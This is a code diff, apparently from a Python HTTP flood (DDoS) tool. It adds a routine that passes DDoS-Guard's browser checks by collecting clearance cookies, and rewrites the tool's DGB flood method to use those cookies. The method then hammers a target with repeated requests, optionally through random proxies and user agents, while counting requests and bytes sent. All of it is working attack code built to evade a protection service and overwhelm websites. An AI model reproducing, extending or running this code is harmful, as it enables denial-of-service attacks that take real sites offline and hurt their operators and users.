@@ -190,6 +190,62 @@ class Tools:
         return True
 
     @staticmethod
+    def dgb_solver(url, host, ua, pro=None):
+        s = None
+        id = None
+        with Session() as s:
+            if pro:
+                s.proxies=pro
+            hdrs = {
+                "User-Agent": ua,
+                "Accept": "text/html",
+                "Accept-Language": "en-US",
+                "Connection": "keep-alive",
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "none",
+                "Sec-Fetch-User": "?1",
+                "TE": "trailers",
+                "DNT": "1"
+                }
+            with s.get(url, headers=hdrs) as ss:
+                for key, value in ss.cookies.items():
+                    if key == '__ddg2':
+                        id = value
+                    s.cookies.set_cookie(cookies.create_cookie(key, value))
+
+            hdrs = {
+                "User-Agent": ua,
+                "Accept": "*/*",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate",
+                "Referer": url,
+                "Sec-Fetch-Dest": "script",
+                "Sec-Fetch-Mode": "no-cors",
+                "Sec-Fetch-Site": "cross-site"
+                }
+            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
+                ss.raise_for_status()
+
+            hdrs = {
+                "User-Agent": ua,
+                "Accept": "image/webp,*/*",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate",
+                "Cache-Control": "no-cache",
+                "Referer": url,
+                "Sec-Fetch-Dest": "script",
+                "Sec-Fetch-Mode": "no-cors",
+                "Sec-Fetch-Site": "cross-site"
+                }
+            with s.get(f"http://{host}/.well-known/ddos-guard/id/{id}", headers=hdrs) as ss:
+                for key, value in ss.cookies.items():
+                    s.cookies.set_cookie(cookies.create_cookie(key, value))
+                    return s
+            
+            return False
+    
+    @staticmethod
     def safe_close(sock=None):
         if sock:
             sock.close()
@@ -799,28 +855,32 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
+    
     def DGB(self):
         global REQUESTS_SENT, BYTES_SEND
-        s = None
-        with suppress(Exception), Session() as s:
-            with s.post(self._target.human_repr()) as ss:
-                ss.raise_for_status()
-                for key, value in ss.cookies.items():
-                    s.cookies.set_cookie(cookies.create_cookie(key, value))
-            for _ in range(min(self._rpc, 5)):
-                sleep(min(self._rpc, 5) / 100)
-                if self._proxies:
-                    pro = randchoice(self._proxies)
-                    with s.get(self._target.human_repr(),
-                               proxies=pro.asRequest()) as res:
+        with suppress(Exception):
+            if self._proxies:
+                pro = randchoice(self._proxies)
+                with Tools.dgb_solver(self._target.human_repr(),self._host,randchoice(self._useragents),pro.asRequest()) as ss:
+                    for _ in range(min(self._rpc, 5)):
+                        sleep(min(self._rpc, 5) / 100)
+                        with ss.get(self._target.human_repr(),
+                                    proxies=pro.asRequest()) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            
+                Tools.safe_close(ss)
+
+            with Tools.dgb_solver(self._target.human_repr(),self._host,randchoice(self._useragents)) as ss:
+                for _ in range(min(self._rpc, 5)):
+                    sleep(min(self._rpc, 5) / 100)
+                    with ss.get(self._target.human_repr()) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
-                        continue
-
-                with s.get(self._target.human_repr()) as res:
-                    REQUESTS_SENT += 1
-                    BYTES_SEND += Tools.sizeOfRequest(res)
-        Tools.safe_close(s)
+                        
+            Tools.safe_close(ss)
+            
+        
 
     def DYN(self):
         payload: Any = str.encode(self._payload +
